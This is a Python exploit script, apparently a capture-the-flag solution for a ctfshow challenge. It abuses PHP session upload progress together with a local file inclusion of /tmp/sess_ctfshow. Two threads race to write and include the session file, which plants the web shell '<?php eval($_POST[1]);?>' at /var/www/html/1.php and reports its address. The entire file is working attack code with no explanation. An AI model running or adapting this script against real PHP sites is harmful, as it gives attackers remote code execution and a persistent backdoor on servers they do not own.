import requests
import threading

session = requests.session()

sess="ctfshow"

file_name="/var/www/html/1.php"
file_content='<?php eval($_POST[1]);?>'

url = "http://59bdde2b-9b8a-4306-ad63-333d6681eda6.challenges.ctfer.com:8080/"

data = {
    "PHP_SESSION_UPLOAD_PROGRESS":f"<?php echo 'success!'; file_put_contents('{file_name}','{file_content}');?>"
}

file= {
    'file':'ctfshow'
}

cookies={
    'PHPSESSID':sess
}


def write():
    while True:
        r = session.post(url=url,data=data,files=file,cookies=cookies)


def read():
    while True:
        r = session.post(url=url+"?file=../../../../../../tmp/sess_ctfshow")
        if "success" in r.text:
            print("shell 地址为："+url+"/1.php")
            exit()


threads = [threading.Thread(target=write),threading.Thread(target=read)]

for t in threads:
    t.start()